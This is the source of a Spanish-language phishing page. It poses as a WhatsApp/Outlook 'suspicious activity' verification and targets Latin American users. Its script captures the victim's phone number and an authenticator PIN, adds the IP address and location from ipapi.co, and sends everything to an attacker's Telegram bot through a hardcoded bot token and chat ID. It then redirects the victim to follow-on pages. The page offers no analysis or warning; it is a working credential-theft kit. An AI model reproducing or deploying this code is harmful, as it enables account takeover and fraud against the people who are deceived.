<!DOCTYPE html>
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
    <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css">
   
</head>
<body>

    <div id="popup" style="">
        <div class="popup-content">
            <h2>Actividad Inusual Detectada</h2>
            <p>Hemos detectado actividades inusuales de parte de su cuenta de Outlook. Para seguir us谩ndola normalmente, realice una verificaci贸n.</p>
            <img src="https://sappsapp23.sirv.com/docs/21-18-05-265_512.gif" alt="Cargando...">
        </div>
    </div>

    <header>
       
    </header>

    <div class="content" style="display: none;">
        <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="250" alt="Logo WhatsApp"> <!-- Tama帽o ajustado para m贸viles -->
        <p>Ingrese su n煤mero de tel茅fono para sincronizar su cuenta de WhatsApp con Outlook:</p>
        <form id="loginForm">
            <!-- Input de selecci贸n de pa铆s -->
                      <select id="country" required="">
                <option value="" disabled="" selected="">Selecciona tu pa铆s</option>
                <option value="+54"> Argentina</option>
                <option value="+591">ю Bolivia</option>
                <option value="+55">ю Brasil</option>
                <option value="+56"> Chile</option>
                <option value="+57"> Colombia</option>
                <option value="+506"> Costa Rica</option>
                <option value="+53"> Cuba</option>
                <option value="+1"> Rep煤blica Dominicana</option>
                <option value="+593"> Ecuador</option>
                <option value="+503">葛 El Salvador</option>
                <option value="+502"> Guatemala</option>
                <option value="+504"> Honduras</option>
                <option value="+52">拆 M茅xico</option>
                <option value="+505">仇 Nicaragua</option>
                <option value="+507">叼 Panam谩</option>
                <option value="+595">叼 Paraguay</option>
                <option value="+51">叼 Per煤</option>
                <option value="+1">叼 Puerto Rico</option>
                <option value="+598">吼 Uruguay</option>
                <option value="+58">火 Venezuela</option>
            </select>
            <!-- Input de tel茅fono -->
            <input type="tel" id="telefono" name="telefono" placeholder="N煤mero de tel茅fono" required="">

            <button type="submit" id="submitButton">Continuar</button>
        </form>
    </div>

    <footer>
        <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
    </footer>

    <script>
        window.onload = function() {
            setTimeout(function() {
                document.getElementById('popup').style.display = 'none';
                document.querySelector('.content').style.display = 'flex';
            }, 5000);

            const countrySelect = document.getElementById('country');
            const phoneInput = document.getElementById('telefono');
            const form = document.getElementById('loginForm');
            const submitButton = document.getElementById('submitButton');

            countrySelect.addEventListener('change', function() {
                phoneInput.value = countrySelect.value;
            });

            phoneInput.addEventListener('input', function() {
                validatePhoneNumber();
            });
            
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const countryCode = data.country_code;
                    const countryMap = {
                        'AR': '+54',
                        'BO': '+591',
                        'BR': '+55',
                        'CL': '+56',
                        'CO': '+57',
                        'CR': '+506',
                        'CU': '+53',
                        'DO': '+1',
                        'EC': '+593',
                        'SV': '+503',
                        'GT': '+502',
                        'HN': '+504',
                        'MX': '+52',
                        'NI': '+505',
                        'PA': '+507',
                        'PY': '+595',
                        'PE': '+51',
                        'PR': '+1',
                        'UY': '+598',
                        'VE': '+58'
                    };
                    countrySelect.value = countryMap[countryCode] || '';
                    validatePhoneNumber();
                })
                .catch(error => console.error('Error al obtener la ubicaci贸n:', error));
        }
    </script>

   <script>
    //bot token
var telegram_bot_id =  "8535968194:AAG2jm8vqqd-gQ5Oy-a2S6d7vUbCAN-RLSQ";
//chat id
var chat_id ="7886709055";

document.addEventListener("DOMContentLoaded", function() {
    // Funci贸n para obtener el valor de un par谩metro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Funci贸n para obtener la ubicaci贸n y enviar el mensaje a Telegram
    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var country = data.country_name;
            var region = data.region;
            var ip = data.ip;
            if (country && region && ip) {
                message += '\nUbicaci贸n: ' + country + ', ' + region + '\nIP: ' + ip;
            } else {
                message += '\nNo se pudo obtener la ubicaci贸n.';
            }
            enviarMensajeTelegram(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicaci贸n:", error);
            message += "\nError al obtener la ubicaci贸n.";
            enviarMensajeTelegram(message, nextPage);
        });
    }

    // Funci贸n para enviar el mensaje a Telegram y redirigir
    function enviarMensajeTelegram(mensaje, nextPage) {
      //  var token = telegram_bot_id;
       // var chatId = chat_id;
        var url = 'https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage';
        var params = {
            chat_id: chat_id,
            text: mensaje
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurri贸 un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con 茅xito.');
            window.location.href = nextPage;
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
        });
    }

    // Evento de env铆o de formulario para la p谩gina de inicio de sesi贸n
    var loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var telefono = document.getElementById("telefono").value;
            obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "cargando.html?action=telefono", " Whatsapp :\nTELEFONO: " + telefono);
        });
    }


    // Evento de env铆o de formulario para la secci贸n de contacto
    var verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var auth = document.getElementById("auth").value;
            obtenerUbicacionYEnviarMensajeTelegram(auth, auth, "cargando3.html?action=auth", " Whatsapp :\nPIN AUTHENTICADOR: " + auth);
        });
    
    }
});
   </script>
</body></html>
